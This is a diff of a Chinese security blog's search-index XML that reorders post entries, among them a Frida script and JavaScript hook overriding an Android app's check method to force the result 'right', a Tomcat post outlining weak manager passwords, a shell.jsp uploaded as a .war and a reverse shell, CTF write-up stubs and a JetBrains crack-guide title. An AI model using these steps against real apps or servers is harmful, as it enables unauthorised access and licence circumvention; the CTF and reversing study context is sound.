class="string">&quot;type&quot;</span>] == <span class="string">&quot;send&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(message[<span class="string">&quot;payload&quot;</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用包名来附加目标应用并执行 JS 代码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_target_application</span>(<span class="params">app_name, js_file</span>):</span><br><span class="line">    <span class="comment"># JavaScript 脚本内容</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(js_file, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> fin:</span><br><span class="line">        script_source = fin.read()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取 USB 设备并通过包名附加到目标应用</span></span><br><span class="line">    <span class="comment"># 也可以使用进程id</span></span><br><span class="line">    device = frida.get_usb_device()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pid = device.spawn(package_name)</span></span><br><span class="line">    <span class="comment"># print(pid)</span></span><br><span class="line">    process = device.attach(app_name)</span><br><span class="line">    <span class="comment"># 创建并加载脚本</span></span><br><span class="line">    script = process.create_script(script_source)</span><br><span class="line">    script.on(<span class="string">&quot;message&quot;</span>, on_message)</span><br><span class="line">    script.load()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 等待用户输入停止信号</span></span><br><span class="line">    sys.stdin.read()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 卸载脚本并分离进程</span></span><br><span class="line">    script.unload()</span><br><span class="line">    process.detach()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主函数</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 设置目标应用的包名</span></span><br><span class="line">    app_name = <span class="string">&quot;My Application&quot;</span></span><br><span class="line"> </span><br><span class="line">    js_file = <span class="string">&quot;scripts/js_file.js&quot;</span></span><br><span class="line">    <span class="comment"># 调用函数进行 hook</span></span><br><span class="line">    hook_target_application(app_name, js_file)</span><br></pre></td></tr></table></figure><h2 id="js模板"><a href="#js模板" class="headerlink" title="js模板"></a>js模板</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 获取 JNI 类</span></span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">Activity</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.example.myapplication.MainActivity&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 重写 getResult 方法</span></span><br><span class="line">    <span class="title class_">Activity</span>.<span class="property">check</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">str</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;getResult called with:&#x27;</span>, str);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 调用原始方法</span></span><br><span class="line">        <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">check</span>(str);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;getResult returned:&#x27;</span>, result);</span><br><span class="line">        <span class="comment">// 返回原始结果</span></span><br><span class="line">        result = <span class="string">&quot;right&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="Q"><a href="#Q" class="headerlink" title="Q"></a>Q</h2><p><code>process = device.attach(app_name)</code> 如果使用包名的话，会报错，需要使用进程id或者应用名称</p><h2 id="Github也有这个issue"><a href="#Github也有这个issue" class="headerlink" title="Github也有这个issue?"></a>Github也有这个issue?</h2><p><a href="/../assets/img/image-120.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-120.png" alt="alt text"></a></p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
-      
-      
-      <categories>
-          
-          <category> 网络安全 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> APP逆向 </tag>
-            
-            <tag> 移动安全 </tag>
             
         </tags>
       
@@ -399,33 +420,6 @@
     
     
     <entry>
-      <title>Web中间件-Tomcat8</title>
-      <link href="/2024/11/13/2024-09-27-web%E4%B8%AD%E9%97%B4%E4%BB%B6-tomcat/"/>
-      <url>/2024/11/13/2024-09-27-web%E4%B8%AD%E9%97%B4%E4%BB%B6-tomcat/</url>
-      
-        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><ol><li>界面<br><a href="/../assets/img/image-107.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-107.png" alt="alt text"></a></li><li>manager 弱口令<br><a href="/../assets/img/image-108.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-108.png" alt="alt text"></a></li><li>上传 war 包<br>直接将shell.jsp压缩，修改后缀为.war即可上传<br><a href="/../assets/img/image-109.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-109.png" alt="alt text"></a></li><li>反弹shell<br><a href="/../assets/img/image-110.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-110.png" alt="alt text"></a><br>意思是在shell文件下的shell.jsp</li></ol></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
-      
-      
-      <categories>
-          
-          <category> 网络安全 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> Web中间件 </tag>
-            
-            <tag> Tomcat </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>MonitorsThree</title>
       <link href="/2024/11/13/2024-09-29-HTB-MonitorsThree-WriteUp/"/>
       <url>/2024/11/13/2024-09-29-HTB-MonitorsThree-WriteUp/</url>
@@ -453,6 +447,33 @@
     
     
     <entry>
+      <title>Web中间件-Tomcat8</title>
+      <link href="/2024/11/13/2024-09-27-web%E4%B8%AD%E9%97%B4%E4%BB%B6-tomcat/"/>
+      <url>/2024/11/13/2024-09-27-web%E4%B8%AD%E9%97%B4%E4%BB%B6-tomcat/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><ol><li>界面<br><a href="/../assets/img/image-107.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-107.png" alt="alt text"></a></li><li>manager 弱口令<br><a href="/../assets/img/image-108.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-108.png" alt="alt text"></a></li><li>上传 war 包<br>直接将shell.jsp压缩，修改后缀为.war即可上传<br><a href="/../assets/img/image-109.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-109.png" alt="alt text"></a></li><li>反弹shell<br><a href="/../assets/img/image-110.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-110.png" alt="alt text"></a><br>意思是在shell文件下的shell.jsp</li></ol></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Web中间件 </tag>
+            
+            <tag> Tomcat </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>JB全家桶破解指南</title>
       <link href="/2024/11/13/2024-09-27-jb-crack-tools/"/>
       <url>/2024/11/13/2024-09-27-jb-crack-tools/</url>
@@ -472,7 +493,7 @@
     
     
     <entry>
-      <title>HTB caption</title>
+      <title>HTB-caption</title>
       <link href="/2024/11/13/2024-09-21-caption/"/>
       <url>/2024/11/13/2024-09-21-caption/</url>
       
@@ -1268,9 +1289,9 @@
       
         <tags>
             
-            <tag> Security </tag>
-            
             <tag> Weixin </tag>
+            
+            <tag> Security </tag>
             
         </tags>
       
@@ -1295,9 +1316,9 @@
       
         <tags>
             
-            <tag> hackthebox </tag>
-            
             <tag> Security </tag>
+            
+            <tag> hackthebox </tag>
             
         </tags>
       
@@ -1362,35 +1383,6 @@
     
     
     <entry>
-      <title>buuoj-强网杯-2019</title>
-      <link href="/2024/11/13/2024-07-26-buuoj-%E5%BC%BA%E7%BD%91%E6%9D%AF-2019/"/>
-      <url>/2024/11/13/2024-07-26-buuoj-%E5%BC%BA%E7%BD%91%E6%9D%AF-2019/</url>
-      
-        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p><a href="/../assets/img/image-4.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-4.png" alt="alt text"></a></p><h3 id="有备份？"><a href="#有备份？" class="headerlink" title="有备份？"></a>有备份？</h3><p>敏感路径泄露</p><p><a href="/../assets/img/image-6.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-6.png" alt="alt text"></a></p><p>代码居多，应该找到函数的入口，或者看看有没有什么敏感的函数 <code>eval</code></p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
-      
-      
-      <categories>
-          
-          <category> CTF </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> CTF </tag>
-            
-            <tag> buuoj </tag>
-            
-            <tag> 强网杯 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>CTFShow Web9</title>
       <link href="/2024/11/13/2024-07-25-ctfshow-web9/"/>
       <url>/2024/11/13/2024-07-25-ctfshow-web9/</url>
@@ -1412,6 +1404,35 @@
             <tag> CTF </tag>
             
             <tag> WebSec </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>buuoj-强网杯-2019</title>
+      <link href="/2024/11/13/2024-07-26-buuoj-%E5%BC%BA%E7%BD%91%E6%9D%AF-2019/"/>
+      <url>/2024/11/13/2024-07-26-buuoj-%E5%BC%BA%E7%BD%91%E6%9D%AF-2019/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p><a href="/../assets/img/image-4.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-4.png" alt="alt text"></a></p><h3 id="有备份？"><a href="#有备份？" class="headerlink" title="有备份？"></a>有备份？</h3><p>敏感路径泄露</p><p><a href="/../assets/img/image-6.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-6.png" alt="alt text"></a></p><p>代码居多，应该找到函数的入口，或者看看有没有什么敏感的函数 <code>eval</code></p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+            <tag> buuoj </tag>
+            
+            <tag> 强网杯 </tag>
             
         </tags>
       
@@ -1673,33 +1694,6 @@
     
     
     <entry>
-      <title>Some Books for CS</title>
-      <link href="/2024/11/13/2024-03-05-some-books-for-cs/"/>
-      <url>/2024/11/13/2024-03-05-some-books-for-cs/</url>
-      
-        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="Some-Books-for-CS"><a href="#Some-Books-for-CS" class="headerlink" title="Some Books for CS"></a>Some Books for CS</h2><p>一些开源书籍，供大家学习使用。建议支持正版。</p><p><a href="https://github.com/lining808/CS-Ebook/raw/main/images/class.svg" title="Alt text" class="gallery-item"><img src="https://github.com/lining808/CS-Ebook/raw/main/images/class.svg" alt="Alt text"></a></p><p>链接：<a href="https://github.com/lining808/CS-Ebook">CS-Ebook</a></p><p><a href="#some-books-for-cs">Some Books for CS</a></p><h1 id="计算机基础"><a href="#计算机基础" class="headerlink" title="计算机基础"></a>计算机基础</h1><table><thead><tr><th>书名</th><th>语言</th><th>封面</th></tr></thead><tbody><tr><td>计算机组成原理</td><td>中文</td><td><a href="https://github.com/lining808/CS-Ebook/raw/main/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%A6%82%E8%AE%BA/%E5%A4%A7%E8%AF%9D%E8%AE%A1%E7%AE%97%E6%9C%BA%20%E5%8D%B71-3.jpg" class="gallery-item"><img src="https://github.com/lining808/CS-Ebook/raw/main/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%A6%82%E8%AE%BA/%E5%A4%A7%E8%AF%9D%E8%AE%A1%E7%AE%97%E6%9C%BA%20%E5%8D%B71-3.jpg"></a></td></tr></tbody></table></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
-      
-      
-      <categories>
-          
-          <category> resource </category>
-          
-          <category> CS </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> books </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>八股文</title>
       <link href="/2024/11/13/2024-03-05-%E5%85%AB%E8%82%A1%E6%96%87/"/>
       <url>/2024/11/13/2024-03-05-%E5%85%AB%E8%82%A1%E6%96%87/</url>
@@ -1719,6 +1713,33 @@
         <tags>
             
             <tag> Interview </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Some Books for CS</title>
+      <link href="/2024/11/13/2024-03-05-some-books-for-cs/"/>
+      <url>/2024/11/13/2024-03-05-some-books-for-cs/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="Some-Books-for-CS"><a href="#Some-Books-for-CS" class="headerlink" title="Some Books for CS"></a>Some Books for CS</h2><p>一些开源书籍，供大家学习使用。建议支持正版。</p><p><a href="https://github.com/lining808/CS-Ebook/raw/main/images/class.svg" title="Alt text" class="gallery-item"><img src="https://github.com/lining808/CS-Ebook/raw/main/images/class.svg" alt="Alt text"></a></p><p>链接：<a href="https://github.com/lining808/CS-Ebook">CS-Ebook</a></p><p><a href="#some-books-for-cs">Some Books for CS</a></p><h1 id="计算机基础"><a href="#计算机基础" class="headerlink" title="计算机基础"></a>计算机基础</h1><table><thead><tr><th>书名</th><th>语言</th><th>封面</th></tr></thead><tbody><tr><td>计算机组成原理</td><td>中文</td><td><a href="https://github.com/lining808/CS-Ebook/raw/main/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%A6%82%E8%AE%BA/%E5%A4%A7%E8%AF%9D%E8%AE%A1%E7%AE%97%E6%9C%BA%20%E5%8D%B71-3.jpg" class="gallery-item"><img src="https://github.com/lining808/CS-Ebook/raw/main/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%A6%82%E8%AE%BA/%E5%A4%A7%E8%AF%9D%E8%AE%A1%E7%AE%97%E6%9C%BA%20%E5%8D%B71-3.jpg"></a></td></tr></tbody></table></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
+      
+      
+      <categories>
+          
+          <category> resource </category>
+          
+          <category> CS </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> books </tag>
             
         </tags>
       
